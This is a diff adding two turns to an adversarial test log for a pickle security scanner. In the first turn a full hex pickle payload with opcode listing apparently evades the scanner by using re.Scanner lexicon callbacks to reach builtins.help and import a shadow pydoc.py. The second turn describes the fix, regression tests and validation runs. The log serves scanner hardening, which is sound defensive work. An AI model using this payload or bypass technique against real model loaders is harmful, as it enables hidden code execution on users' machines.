@@ -19706,3 +19706,194 @@ format unchanged; lint clean; mypy clean across 447 files
 PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
 3868 passed, 1022 skipped, 21 warnings in 49.26s
 ```
+
+## Turn 287 - Bypass via stored `re.Scanner` lexicon callbacks
+
+Offensive turn after the Turn 286 defense. The scanner now preserves literal
+patterns for compiled regex replacement callbacks, but `re.Scanner` exposes a
+stored callback table: each lexicon entry pairs a regex phrase with an action
+callable, and `Scanner.scan(...)` invokes the action as
+`action(scanner, token)` whenever the phrase matches.
+
+Representative payload:
+
+```python
+scanner = re.Scanner((("x", builtins.help),))
+re.Scanner.scan(scanner, "x")
+```
+
+The shadow `pydoc.py` writes a marker at import time and defines `help()` to
+return a token value. Unpickling constructs the scanner with a clean-looking
+lexicon, then calls the unbound `re.Scanner.scan` descriptor. The scan invokes
+`builtins.help(scanner, "x")`, importing attacker-controlled `pydoc.py`.
+
+```text
+payload_len 71
+payload_hex 80048c0272658c075363616e6e657293288c01788c086275696c74696e738c0468656c70937485855294308c0272658c0c5363616e6e65722e7363616e932868008c017874522e
+
+0: PROTO              4
+15: STACK_GLOBAL       # re.Scanner
+17: SHORT_BINUNICODE   # phrase "x"
+36: STACK_GLOBAL       # builtins.help action callback
+37: TUPLE              # ("x", help)
+38: TUPLE1             # lexicon = (("x", help),)
+39: TUPLE1             # Scanner args = (lexicon,)
+40: REDUCE             # re.Scanner(lexicon)
+41: MEMOIZE            # memo[0] = scanner
+42: POP
+61: STACK_GLOBAL       # re.Scanner.scan method descriptor
+63: BINGET             # scanner receiver
+65: SHORT_BINUNICODE   # input "x"
+68: TUPLE              # (scanner, "x")
+69: REDUCE             # re.Scanner.scan(scanner, "x")
+70: STOP
+```
+
+Scanner proof:
+
+```text
+scan clean findings 0 errors ()
+imports [
+  ('re', 'Scanner', 15, False),
+  ('builtins', 'help', 36, False),
+  ('re', 'Scanner.scan', 61, False),
+]
+invocations [
+  ('re', 'Scanner', None, 40),
+  ('re', 'Scanner.scan', 2, 69),
+]
+```
+
+Runtime proof:
+
+```text
+runtime_rc 0
+runtime_type tuple
+runtime_result (['TOKEN:x'], '')
+marker_exists True
+marker_text owned-by-re-scanner
+```
+
+Callback boundary:
+
+```text
+scanner = re.Scanner((("z", builtins.help),))
+re.Scanner.scan(scanner, "x")
+scan clean findings 0
+runtime_result ([], 'x')
+marker_exists False
+```
+
+Why it bypasses:
+
+- `re.Scanner` and `re.Scanner.scan` are clean import references.
+- `builtins.help` is clean until the scanner records an actual callable
+  invocation.
+- The current native stack model preserves `RegexPattern` for `re.compile`, but
+  it still collapses `re.Scanner(lexicon)` to an opaque constructed value.
+- Because the lexicon callback is stored inside the scanner receiver, the
+  callback-dispatch table has no access to the phrase/action pair when
+  `Scanner.scan(scanner, input)` is reduced.
+
+Likely source-level defense:
+
+- Model `re.Scanner(lexicon)` as a callback-bearing stack value when the lexicon
+  contains a tracked literal phrase and callable action.
+- Add `re.Scanner.scan` callback-dispatch handling with receiver slot 0, input
+  slot 1, callback arity 2, and a literal phrase/input match guard.
+- Keep no-match scans clean when every tracked literal phrase is absent from
+  the literal input.
+
+Simplification note:
+
+- This is the stored-callback sibling of `RegexPattern`: instead of storing only
+  a regex phrase, the receiver stores `(phrase, action)` entries.
+- A compact `RegexScanner { rules }` stack value would keep regex callback
+  handling source-level and finite: top-level replacement callbacks, compiled
+  pattern callbacks, and scanner lexicon callbacks all share literal-match
+  guards.
+
+Performance note:
+
+- The representative payload is 71 bytes.
+- Warm scan timing over 1000 runs was median `0.000055s`, p95 `0.000057s`,
+  and max `0.000202s`.
+
+## Turn 288 - Defense for `re.Scanner` stored callbacks
+
+Defensive turn for the Turn 287 bypass. The fix models `re.Scanner` as a
+stored-callback receiver instead of broadening the generic tuple-depth limit or
+adding a package policy block.
+
+Implementation:
+
+- Added compact `RegexScannerRule`, `RegexScannerLexicon`, and `RegexScanner`
+  stack representations.
+- When a tuple has scanner-lexicon shape like `(("phrase", callable), ...)`,
+  the stack model compacts it into tracked scanner rules before the outer
+  constructor argument tuple would otherwise exceed the generic tuple-depth cap.
+- `re.Scanner(lexicon)` preserves tracked literal phrase/action pairs as a
+  `RegexScanner` stack value.
+- `re.Scanner.scan(scanner, input)` emits a synthetic callback invocation for
+  the first tracked action whose plain literal phrase is empty or contained in
+  the literal input.
+- Plain `re.Scanner(...)` constructor invocation metadata is suppressed because
+  the constructor stores callbacks but does not invoke them; the RCE edge is the
+  later `Scanner.scan(...)` action callback.
+
+Regression coverage:
+
+- `re.Scanner((("x", builtins.help),)).scan("x")` is malicious and records
+  `builtins.help(scanner, token)` with two positional arguments.
+- `re.Scanner((("z", builtins.help),)).scan("x")` remains clean and does not
+  import shadow `pydoc.py` at runtime.
+
+Post-fix proof for the representative payload:
+
+```text
+payload_len 71
+scan malicious findings 1 errors ()
+invocations [
+  ('re', 'Scanner.scan', 2, 69),
+  ('builtins', 'help', 2, 69),
+]
+no_match_scan clean findings 0
+no_match_invocations [
+  ('re', 'Scanner.scan', 2, 69),
+]
+runtime_rc 0
+runtime_type tuple
+runtime_result (['TOKEN:x'], '')
+marker_exists True
+marker_text owned-by-re-scanner
+```
+
+Performance note:
+
+- Warm scan timing over 1000 post-fix runs was median `0.000108s`, p95
+  `0.000111s`, and max `0.000127s`.
+- The lexicon compaction only activates for tuples of two-item
+  `(literal_phrase, callable)` rules and stores only the finite phrase/action
+  pairs needed by `Scanner.scan`.
+
+Validation:
+
+```text
+cargo test --manifest-path packages/modelaudit-picklescan/Cargo.toml
+78 passed
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py::test_scan_bytes_blocks_re_scanner_action_callback_rce packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py::test_scan_bytes_keeps_re_scanner_no_match_action_callback_lazy -q
+2 passed
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_import_statements.py -q
+155 passed
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest packages/modelaudit-picklescan/tests/test_call_graph_*.py -q
+193 passed
+
+ruff format/check, mypy
+format unchanged; lint clean; mypy clean across 447 files
+
+PROMPTFOO_DISABLE_TELEMETRY=1 pytest -n auto -m "not slow and not integration" --maxfail=1
+3870 passed, 1022 skipped, 21 warnings in 48.87s
+```
